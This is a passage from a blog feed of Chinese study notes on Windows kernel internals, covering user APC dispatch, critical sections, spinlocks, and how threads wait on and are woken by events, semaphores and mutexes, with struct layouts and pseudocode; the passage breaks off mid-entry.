title="ntdll.KiUserApcDispatcher分析(参加代码)"></a>ntdll.KiUserApcDispatcher分析(参加代码)</h2><p>1、当用户在3环调用QueueUserAPC函数来插入APC时，不需要提供<br>NormalRoutine，这个参数是在QueueUserAPC内部指定的：</p><p>BaseDispatchAPC</p><p>2、ZwContinue函数的意义：</p><p>1) 返回内核，如果还有用户APC，重复上面的执行过程。</p><p>2) 如果没有需要执行的用户APC，会将CONTEXT赋值给Trap_Frame结构体。就像从来没有修改过一样。ZwContinue后面的代码不会执行，线程从哪里进0环仍然会从哪里回去。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>1) 内核APC在线程切换时执行，不需要换栈，比较简单，一个循环执行完毕。</p><p>2) 用户APC在系统调用、中断或异常返回3环前会进行判断，如果有要执行的用户APC，再执行。 </p><p>3) 用户APC执行前会先执行内核APC。  </p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>[1] 滴水视频  </p>]]></content>
      
      <categories>
          
          <category> 笔记 - APC异步过程调用笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> APC异步过程调用 </tag>
            
            <tag> 内核安全 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Windows等待唤醒机制</title>
      <link href="/2018/07/07/Windows%E7%AD%89%E5%BE%85%E5%94%A4%E9%86%92%E6%9C%BA%E5%88%B6/"/>
      <url>/2018/07/07/Windows%E7%AD%89%E5%BE%85%E5%94%A4%E9%86%92%E6%9C%BA%E5%88%B6/</url>
      <content type="html"><![CDATA[<h1 id="临界区"><a href="#临界区" class="headerlink" title="临界区"></a>临界区</h1><p>并发是指多个线程在同时执行：<br>单核（是分时执行，不是真正的同时）<br>多核（在某一个时刻，会同时有多个线程再执行）<br>同步则是保证在并发执行的环境中各个线程可以有序的执行    </p><h2 id="临界区：一次只允许一个线程进入直到离开"><a href="#临界区：一次只允许一个线程进入直到离开" class="headerlink" title="临界区：一次只允许一个线程进入直到离开"></a>临界区：一次只允许一个线程进入直到离开</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">DWORD dwFlag = 0;//实现临界区的方式就是加锁</span><br><span class="line">//锁：全局变量  进去加一 出去减一</span><br><span class="line"></span><br><span class="line">if(dwFlag  == 0)//进入临界区</span><br><span class="line">&#123;</span><br><span class="line">dwFlag   = 1</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line">.......</span><br><span class="line"></span><br><span class="line">dwFlag   = 0//离开临界区</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="自己实现临界区"><a href="#自己实现临界区" class="headerlink" title="自己实现临界区"></a>自己实现临界区</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">全局变量：Flag = 0</span><br><span class="line"></span><br><span class="line">进入临界区：</span><br><span class="line">Lab：</span><br><span class="line">mov eax,1</span><br><span class="line">lock xadd [Flag],eax</span><br><span class="line">cmp eax,0</span><br><span class="line">jz endLab</span><br><span class="line">dec [Flag]</span><br><span class="line">//线程等待Sleep..</span><br><span class="line">endLab:</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">离开临界区：</span><br><span class="line"></span><br><span class="line">lock dec [Flag]</span><br></pre></td></tr></table></figure><h1 id="自旋锁"><a href="#自旋锁" class="headerlink" title="自旋锁"></a>自旋锁</h1><h2 id="Windows自旋锁"><a href="#Windows自旋锁" class="headerlink" title="Windows自旋锁"></a>Windows自旋锁</h2><p>关键代码：<br>lock bts dword ptr [ecx], 0</p><p>LOCK是锁前缀，保证这条指令在同一时刻只能有一个CPU访问<br>BTS指令：设置并检测  将ECX指向数据的第0位置1<br>如果[ECX]原来的值==0  那么CF=1 否则CF=0   </p><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/23.png" alt="23"></p><p>写pause，因为是多核，不用切换线程，等一等就好，Sleep会造成线程切换，没必要。  </p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>1、自旋锁只对多核有意义。<br>(查看不同版本的KeAcquireSpinLockAtDpcLevel函数)<br>2、自旋锁与临界区、事件、互斥体一样，都是一种同步机制，都可以让当前线程<br>处于等待状态，区别在于自旋锁不用切换线程。</p><h1 id="线程等待与唤醒"><a href="#线程等待与唤醒" class="headerlink" title="线程等待与唤醒"></a>线程等待与唤醒</h1><p>我们在之前的课程里面讲解了如何自己实现临界区以及什么是Windows自旋锁，这两种同步方案在线程无法进入临界区时都会让当前线程进入等待状态，<br>一种是通过Sleep函数实现的，一种是通过让当前的CPU”空转”实现的，但这两种等待方式都有局限性：<br>1) 通过Sleep函数进行等待，等待时间该无法确定<br>2) 通过“空转”的方式进行等待，只有等待时间很短的情况下才有意义，否则对CPU资源是种浪费。而且自旋锁只能在多核的环境下才有意义。<br>有没有更加合理的等待方式呢？只有在条件成熟的时候才将当前线程唤醒？</p><h2 id="Windows等待与唤醒机制"><a href="#Windows等待与唤醒机制" class="headerlink" title="Windows等待与唤醒机制"></a>Windows等待与唤醒机制</h2><p>在Windows中，一个线程可以通过等待一个或者多个可等待对象，从而进入等待状态，另一个线程可以在某些时刻唤醒等待这些对象的其他线程。   </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">线程AWaitForSingleObject/WaitForMultipleObjects</span><br><span class="line">--&gt;可等待对象</span><br><span class="line">线程BSetEvent/ReleaseSemaphore/ReleaseMutant</span><br><span class="line">--&gt;可等待对象</span><br></pre></td></tr></table></figure><h2 id="可等待对象"><a href="#可等待对象" class="headerlink" title="可等待对象"></a>可等待对象</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">在Windbg中查看如下结构体：</span><br><span class="line"></span><br><span class="line">dt _KPROCESS进程</span><br><span class="line"></span><br><span class="line">dt _KTHREAD线程</span><br><span class="line"></span><br><span class="line">dt _KTIMER定时器</span><br><span class="line"></span><br><span class="line">dt _KSEMAPHORE信号量</span><br><span class="line"></span><br><span class="line">dt _KEVENT事件</span><br><span class="line"></span><br><span class="line">dt _KMUTANT互斥体</span><br><span class="line"></span><br><span class="line">dt _FILE_OBJECT文件</span><br></pre></td></tr></table></figure><p>这些可等待对象的特点是都是一个结构体，都有一个成员，即第一个成员_DISPATCHER_HEADER（有些·1比较特殊，文件比较特殊不在第一个成员）   </p><p>那么第一个是与不是_DISPATCHER_HEADER的对象有什么区别呢   </p><h2 id="可等待对象的差异"><a href="#可等待对象的差异" class="headerlink" title="可等待对象的差异"></a>可等待对象的差异</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WaitForSingleObject(3环)</span><br><span class="line"></span><br><span class="line">NtWaitForSingleObject(内核)</span><br><span class="line">1) 通过3环用户提供的句柄，找到等待对象的内核地址。            </span><br><span class="line"></span><br><span class="line"> 2) 如果是以_DISPATCHER_HEADER开头，直接使用。</span><br><span class="line"></span><br><span class="line">3) 如果不是以_DISPATCHER_HEADER开头的对象,则找到在其中嵌入的_DISPATCHER_HEADER对象。</span><br><span class="line"></span><br><span class="line">KeWaitForSingleObject(内核)</span><br><span class="line">核心功能，后面会讲</span><br></pre></td></tr></table></figure><h2 id="一个线程等待一个对象"><a href="#一个线程等待一个对象" class="headerlink" title="一个线程等待一个对象"></a>一个线程等待一个对象</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/24.png" alt="24"></p><p>被等待对象有个变量是WaitListHead圈着所有等待块，把等待他的所有线程的等待块，就是第一个参数WaitListEntry</p><h2 id="一个线程等待多个对象"><a href="#一个线程等待多个对象" class="headerlink" title="一个线程等待多个对象"></a>一个线程等待多个对象</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/25.png" alt="25"></p><h2 id="等待网"><a href="#等待网" class="headerlink" title="等待网"></a>等待网</h2><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/26.png" alt="26"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>1、等待中的线程，一定在等待链表中(KiWaitListHead)，同时也一定在这张网上(KTHREAD +5C的位置不为空)。</p><p>2、线程通过调用WaitForSingleObject/WaitForMultipleObjects函数将自己挂到这张网上。</p><p>3、线程什么时候会再次执行取决于其他线程何时调用相关函数，等待对象不同调用的函数也不同。</p><h1 id="WaitForSingleObject函数分析"><a href="#WaitForSingleObject函数分析" class="headerlink" title="WaitForSingleObject函数分析"></a>WaitForSingleObject函数分析</h1><p>无论可等待对象是何种类型，线程都是通过：<br>WaitForSingleObject<br>WaitForMultipleObjects<br>进入等待状态的，这两个函数是理解线程等待与唤醒进制的核心   </p><h2 id="WaitForSingleObject参数说明"><a href="#WaitForSingleObject参数说明" class="headerlink" title="WaitForSingleObject参数说明"></a>WaitForSingleObject参数说明</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">WaitForSingleObject对应的内核函数：</span><br><span class="line"></span><br><span class="line">NTSTATUS __stdcall NtWaitForSingleObject(</span><br><span class="line">HANDLE Handle, </span><br><span class="line">BOOLEAN Alertable, </span><br><span class="line">PLARGE_INTEGER Timeout)</span><br><span class="line"></span><br><span class="line">Handle 用户层传递的等待对象的句柄(具体细节参加句柄表专题)</span><br><span class="line"></span><br><span class="line">Alertable 对应KTHREAD结构体的Alertable属性  如果为1 在插入用户APC时，该线程将被吵醒  </span><br><span class="line"></span><br><span class="line">Timeout 超时时间</span><br></pre></td></tr></table></figure><h2 id="NtWaitForSingleObject"><a href="#NtWaitForSingleObject" class="headerlink" title="NtWaitForSingleObject"></a>NtWaitForSingleObject</h2><p>1)  调用ObReferenceObjectByHandle函数，通过对象句柄找到等待对象结构体地址。<br>2)  调用KeWaitForSingleObject函数，进入关键循环。    </p><h2 id="KeWaitForSingleObject：上半部分"><a href="#KeWaitForSingleObject：上半部分" class="headerlink" title="KeWaitForSingleObject：上半部分"></a>KeWaitForSingleObject：上半部分</h2><p>这个函数开始执行需要准备等待块，当前线程通过等待块与被等待线程关联。当等待时间不为零，有2个要等待的事件，还有一个是定时器。<br>1) 向_KTHREAD(+70)位置的等待块赋值。</p><p>2) 如果超时时间不为0，KTHREAD(+70)第四个等待块与第一个等待块关联起来：<br>第一个等待块指向第四个等待块，第四个等待块指向第一个等待块。</p><p>3) KTHREAD(+5C)指向第一个_KWAIT_BLOCK。</p><p>4) 进入关键循环</p><h3 id="关键循环："><a href="#关键循环：" class="headerlink" title="关键循环："></a>关键循环：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_DISPATCHER_HEADER</span><br><span class="line">   +0x000 Type//对象类型  </span><br><span class="line">   +0x001 Absolute         </span><br><span class="line">   +0x002 Size             </span><br><span class="line">   +0x003 Inserted         </span><br><span class="line">   +0x004 SignalState//是否有信号(&gt;0)        </span><br><span class="line">   +0x008 WaitListHead     //双向链表头  圈着所有等待块</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)<span class="comment">//每次线程被其他线程唤醒，都要进入这个循环</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(符合激活条件)<span class="comment">//1、超时   2、等待对象SignalState&gt;0 </span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//1) 修改SignalState</span></span><br><span class="line"><span class="comment">//2) 退出循环</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(第一次执行)</span><br><span class="line">      将当前线程的等待块挂到等待对象的链表(WaitListHead)中;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将自己挂入等待队列(KiWaitListHead)</span></span><br><span class="line"><span class="comment">//切换线程...再次获得CPU时，从这里开始执行</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//1) 线程将自己+5C位置清0</span></span><br><span class="line"><span class="comment">//2) 释放_KWAIT_BLOCK所占内存</span></span><br></pre></td></tr></table></figure><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>不同的等待对象，用不同的方法来修改_DISPATCHER_HEADER(SignalState)<br>比如：如果可等待对象是EVENT,其他线程通常使用SetEvent来设置SignalState = 1<br>并且，将正在等待该对象的其他线程唤醒，也就是从等待链表(KiWaitListHead)中摘出来。但是，SetEvent函数并不会将线程从等待网上摘下来，是否要下来，由当前线程自己来决定。   </p><h2 id="关于强制唤醒"><a href="#关于强制唤醒" class="headerlink" title="关于强制唤醒"></a>关于强制唤醒</h2><p>在APC专题中讲过，当我们插入一个用户APC时(Alertable=1)，当前线程是可以被唤醒的，但并不是真正的唤醒。因为，如果当前的线程在等待网上，执行完用户APC后，仍然要进入等待状态。</p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><p>关于线程什么时候把自己变成等待的，就是通过线程自己操作的，线程在进入临界区之前会调用WaitForSingleObject或者WaitForMultipleObjects,去判断等待对象，信号量是否有信号，如果有修改信号量，退出函数退出循环，将自己+5C位置清零，释放内存，如果发现信号量为0，并且是第一次执行，将线程自己的等待块挂到此对象的等待列表里，创建线程关于这个等待对象的等待块将其挂到等待对象的链表中，如果线程切换再次获得CPU，当前线程便会在WaitForSingleObject或者WaitForMultipleObjects恢复执行(在哪切换在哪开始执行)从这里开始执行。<br>关于唤醒，总得来说就是其他唤醒线程把信号量激活（不同等待对象（比如Event）不同，唤醒函数不同，比如SetEvent），修改信号量，改为有信号，比如1，然后内核等待对象把所有等待他的线程（通过WaitListHead链找）从等待链表里摘掉，然后等待线程从当初挂起的地方开始执行，自己再次进入循环，判断能否被激活，比如还有没有等待其他对象，如果没有，当前线程便会在WaitForSingleObject或者WaitForMultipleObjects恢复执行(在哪切换在哪开始执行)，如果符合唤醒条件，自己把自己线程的5C清0，然后自己把自己从等待网里弄出去。这样就把自己激活了(此时会修改SignalState的值，并将自己从等待网上摘下来，此时的线程才是真正的唤醒，),如果有继续变非唤醒，重新把自己挂到等待列表上。      </p><h1 id="EVENT"><a href="#EVENT" class="headerlink" title="EVENT"></a>EVENT</h1><p>在之前的课程里面讲过，线程在进入临界区之前会调用WaitForSingleObject或者WaitForMultipleObjects,此时如果有信号，线程会从函数中退出并进入临界区，如果没有信号那么线程将自己挂入等待链表，然后将自己挂入等待网，最后切换线程。<br>其他线程在适当的时候，调用方法修改被等待对象的SignalState为有信号(不同的等待对象，会调用不同的函数)，并将等待该对象的其他线程从等待链表中摘掉，这样，当前线程便会在WaitForSingleObject（一次挂一到两个等待块）或者WaitForMultipleObjects（一次挂多个等待块）恢复执行(在哪切换在哪开始执行)，如果符合唤醒条件，此时会修改SignalState的值，并将自己从等待网上摘下来，此时的线程才是真正的唤醒。   </p><h2 id="被等待对象不同，主要在2个点上会有差异："><a href="#被等待对象不同，主要在2个点上会有差异：" class="headerlink" title="被等待对象不同，主要在2个点上会有差异："></a>被等待对象不同，主要在2个点上会有差异：</h2><ol><li>唤醒改信号的函数不同。  </li><li>当前线程被唤醒时候，判断激活条件不同。<br>通知类型对象不改SignalState值，所以通知类型都可以执行。  </li></ol><p>##<br>创建事件对象：信号<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CreateEvent(NULL, </span><br><span class="line">TRUE, //当前对象类型，TRUE  通知类型对象</span><br><span class="line">                    //FALSE 事件同步对象</span><br><span class="line"></span><br><span class="line">FALSE//创建是是否有信号，就是SignalState初始值</span><br><span class="line">, NULL);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_DISPATCHER_HEADER</span><br><span class="line">   +0x000 Type</span><br><span class="line">   +0x001 Absolute</span><br><span class="line">   +0x002 Size</span><br><span class="line">   +0x003 Inserted</span><br><span class="line">   +0x004 SignalState</span><br><span class="line">   +0x008 WaitListHead</span><br><span class="line"></span><br><span class="line">(代码演示)</span><br></pre></td></tr></table></figure></p><h2 id="SetEvent函数分析"><a href="#SetEvent函数分析" class="headerlink" title="SetEvent函数分析"></a>SetEvent函数分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">SetEvent对应的内核函数：KeSetEvent</span><br><span class="line"></span><br><span class="line">1) 修改信号值SignalState为1</span><br><span class="line"></span><br><span class="line">2) 判断对象类型</span><br><span class="line"></span><br><span class="line">3) 如果类型为通知类型对象(0)   唤醒所有等待该状态的线程</span><br><span class="line"></span><br><span class="line">4) 如果类型为事件同步对象(1)   从链表头找到第一个，找等待类型是WaitAny的。</span><br></pre></td></tr></table></figure><h1 id="SEMAPHORE"><a href="#SEMAPHORE" class="headerlink" title="SEMAPHORE"></a>SEMAPHORE</h1><p>上一节课我们讲到了事件(EVENT)对象，线程在进入临界区之前会通过调用WaitForSingleObject或者WaitForMultipleObjects来判断当前的事件对象是否有信号(SignalState&gt;0),只有当事件对象有信号时，才可以进入临界区(只允许一个线程进入直到退出的一段代码，不单指用EnterCriticalSection() 和 LeaveCriticalSection() 而形成的临界区)。<br>通过我们对EVENT对象相关函数的分析，我们发现，EVENT对象的SignalState值只有2种可能：<br>1  初始化时  或者调用  SetEvent<br>0  WaitForSingleObject、WaitForMultipleObjects、ResetEvent    </p><p>信号量跟事件最大差异，运行多个线程同时进入临界区   </p><h2 id="创建信号量对象"><a href="#创建信号量对象" class="headerlink" title="创建信号量对象"></a>创建信号量对象</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">CreateSemaphore</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">LPSECURITY_ATTRIBUTES lpSemaphoreAttributes,</span></span></span><br><span class="line"><span class="function"><span class="params">LONG lInitialCount,</span></span></span><br><span class="line"><span class="function"><span class="params">LONG lMaximumCount,<span class="comment">//赋值给Limit</span></span></span></span><br><span class="line"><span class="function"><span class="params">LPCTSTR lpName</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line">_KSEMAPHORE</span><br><span class="line">   +<span class="number">0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   +<span class="number">0x010</span> Limit            : Int4B<span class="comment">//lMaximumCount</span></span><br><span class="line">_DISPATCHER_HEADER</span><br><span class="line">   +<span class="number">0x000</span> Type <span class="comment">//信号量类型为5</span></span><br><span class="line">   +<span class="number">0x001</span> Absolute </span><br><span class="line">   +<span class="number">0x002</span> Size</span><br><span class="line">   +<span class="number">0x003</span> Inserted</span><br><span class="line">   +<span class="number">0x004</span> SignalState<span class="comment">//lInitialCount</span></span><br><span class="line">   +<span class="number">0x008</span> WaitListHead</span><br></pre></td></tr></table></figure><h2 id="ReleaseSemaphore函数分析"><a href="#ReleaseSemaphore函数分析" class="headerlink" title="ReleaseSemaphore函数分析"></a>ReleaseSemaphore函数分析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">ReleaseSemaphore_3Ring--&gt;NtReleaseSemaphore</span><br><span class="line">NtReleaseSemaphore--&gt;KeReleaseSemaphore</span><br></pre></td></tr></table></figure><p>1) 设置SignalState = SignalState  + N(参数,释放几个)</p><p>2) 通过WaitListHead找到所有线程，并从等待链表中摘掉。</p><h2 id="MUTANT"><a href="#MUTANT" class="headerlink" title="MUTANT"></a>MUTANT</h2><h2 id="为什么要有互斥体：等待对象被遗弃"><a href="#为什么要有互斥体：等待对象被遗弃" class="headerlink" title="为什么要有互斥体：等待对象被遗弃"></a>为什么要有互斥体：等待对象被遗弃</h2><p>可以通过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+0x010 MutantListEntry  : _LIST_ENTRY</span><br></pre></td></tr></table></figure></p><p>解决被遗弃。<br>互斥体(MUTANT)与事件(EVENT)和信号量(SEMAPHORE)一样，都可以用来进行线程的同步控制。<br>但需要指出的是，这几个对象都是内核对象，这就意味着，通过这些对象可以进行跨进程的线程同步控制,比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A进程中的X线程--&gt;等待对象Z</span><br><span class="line">B进程中的Y线程--&gt;等待对象Z</span><br></pre></td></tr></table></figure><p>极端情况：   </p><p>如果B进程的Y线程还没有来得及调用修改SignalState的函数(如SetEvent)<br>那么等待对象Z将被遗弃，这也就以为者X线程将永远等下去！</p><h2 id="为什么要有互斥体：重入"><a href="#为什么要有互斥体：重入" class="headerlink" title="为什么要有互斥体：重入"></a>为什么要有互斥体：重入</h2><p>如果使用互斥体，A对象多次进入临界区，下面代码就不会死锁</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WaitForSingleObject(A)</span><br><span class="line">.....</span><br><span class="line">WaitForMultipleObjects(A,B,C)</span><br><span class="line">.....</span><br><span class="line"></span><br><span class="line">SetEvent/ReleaseSemaphore</span><br><span class="line"></span><br><span class="line">死锁</span><br></pre></td></tr></table></figure><h2 id="MUTANT结构体介绍"><a href="#MUTANT结构体介绍" class="headerlink" title="MUTANT结构体介绍"></a>MUTANT结构体介绍</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">KMUTANT</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x010 MutantListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x018 OwnerThread      : Ptr32 _KTHREAD   </span><br><span class="line">   +0x01c Abandoned        : UChar</span><br><span class="line">   +0x01d ApcDisable       : UChar</span><br><span class="line"></span><br><span class="line">MutantListEntry：</span><br><span class="line">拥有互斥体线程(KTHREAD+0x010 MutantListHead)是个链表头 圈着所有互斥体</span><br><span class="line">OwnerThread：</span><br><span class="line">正在拥有互斥体的线程</span><br><span class="line">Abandoned：</span><br><span class="line">是否已经被放弃不用</span><br><span class="line">ApcDisable：</span><br><span class="line">是否禁用内核APC</span><br></pre></td></tr></table></figure><h3 id="为什么互斥体能重复进入临界区"><a href="#为什么互斥体能重复进入临界区" class="headerlink" title="为什么互斥体能重复进入临界区"></a>为什么互斥体能重复进入临界区</h3><p>因为互斥体有个变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">+0x018 OwnerThread      : Ptr32 _KTHREAD</span><br></pre></td></tr></table></figure></p><h2 id="CreateMutex函数Ring3"><a href="#CreateMutex函数Ring3" class="headerlink" title="CreateMutex函数Ring3"></a>CreateMutex函数Ring3</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">HANDLE CreateMutex(</span><br><span class="line">LPSECURITY_ATTRIBUTE SlpMutexAttributes, // 指向安全属性的指针</span><br><span class="line">BOOL bInitialOwner, //初始化互斥对象的所有者，互斥体对象属于哪个线程。TRUE说明属于当前线程 </span><br><span class="line">LPCTSTR lpName // 指向互斥对象名的指针</span><br><span class="line">);</span><br><span class="line">CreateMutex-&gt;NtCreateMutant(内核函数) -&gt;    KeInitializeMutant(内核函数)</span><br><span class="line">初始化MUTANT结构体：</span><br><span class="line">MUTANT.Header.Type=2;</span><br><span class="line">MUTANT.Header.SignalState=bInitialOwner?0:1;</span><br><span class="line">MUTANT.OwnerThread=当前线程 or NULL;</span><br><span class="line">MUTANT.Abandoned=0;</span><br><span class="line">MUTANT.ApcDisable=0;</span><br><span class="line"></span><br><span class="line">bInitialOwner==TRUE  将当前互斥体挂入到当前线程的互斥体链表</span><br><span class="line">(KTHREAD+0x010 MutantListHead)</span><br></pre></td></tr></table></figure><p><img src="https://yangruiqi.oss-cn-beijing.aliyuncs.com/win32/27.png" alt="27"></p><h2 id="如果信号量不为零或者互斥体属于当前线程都能进入临界区"><a href="#如果信号量不为零或者互斥体属于当前线程都能进入临界区" class="headerlink" title="如果信号量不为零或者互斥体属于当前线程都能进入临界区"></a>如果信号量不为零或者互斥体属于当前线程都能进入临界区</h2><p>ReleaseMutex函数<br>BOOL WINAPI ReleaseMutex(HANDLE hMutex);<br>调用时，会这么调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">ReleaseMutex--&gt;NtReleaseMutant</span><br><span class="line">NtReleaseMutant--&gt;KeReleaseMutant</span><br></pre></td></tr></table></figure></p><p>正常调用时：<br>MUTANT.Header.SignalState++;<br>如果SignalState=1 （因为每次进入临界区可以一直减）说明其他进程可用了  将该互斥体从线程链表中移除。    </p><h2 id="如何解决重入问题"><a href="#如何解决重入问题" class="headerlink" title="如何解决重入问题"></a>如何解决重入问题</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">_KMUTANT</span><br><span class="line">   +0x000 Header           : _DISPATCHER_HEADER</span><br><span class="line">   +0x010 MutantListEntry  : _LIST_ENTRY</span><br><span class="line">   +0x018 OwnerThread      : Ptr32 _KTHREAD   </span><br><span class="line">   +0x01c Abandoned        : UChar</span><br><span class="line">   +0x01d ApcDisable       : UChar</span><br><span class="line"></span><br><span class="line">OwnerThread：</span><br><span 